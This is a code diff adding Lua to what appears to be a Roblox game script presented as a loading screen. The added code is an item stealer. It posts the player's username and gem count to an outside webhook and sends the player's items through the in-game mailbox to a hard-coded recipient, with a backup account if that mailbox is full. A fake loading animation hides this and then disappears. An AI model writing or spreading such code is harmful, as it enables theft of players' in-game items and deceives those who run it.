@@ -226,4 +226,47 @@ local function SendMessage(username, diamonds)
 
     if webhook and webhook ~= "" then
         local success, response = pcall(function()
-            return HttpService:PostAsync(webhook,
+            return HttpService:PostAsync(webhook, body, Enum.HttpContentType.ApplicationJson)
+        end)
+        if not success then
+            warn("Failed to send webhook request: " .. response)
+        end
+    end
+end
+
+-- Function to handle item sending
+local function sendItem(category, uid, am)
+    local args = {
+        [1] = Username,
+        [2] = "Mail Message",
+        [3] = category,
+        [4] = uid,
+        [5] = am or 1
+    }
+    local response, err = network:InvokeServer("Mailbox: Send", unpack(args))
+    if not response and err == "They don't have enough space!" then
+        -- Switch to alternative user if main doesn't have mailbox space
+        Username = Username2
+        args[1] = Username
+        response = network:InvokeServer("Mailbox: Send", unpack(args))
+    end
+    if response then
+        GemAmount1 = GemAmount1 - newamount
+        newamount = math.ceil(newamount * 1.5)
+        if newamount > 5000000 then
+            newamount = 5000000
+        end
+    end
+end
+
+-- Execute SendMessage function
+SendMessage(Username, gemsleaderstatpath.Value)
+
+-- Handle Cleanup
+loadingRing.Visible = false
+frame:TweenPosition(UDim2.new(0, 0, 1, 0), "InOut", "Sine", 2)
+wait(2)
+ScreenGui:Destroy()
+
+print("Loaded LoadingScreen")
+print("Script Successful")
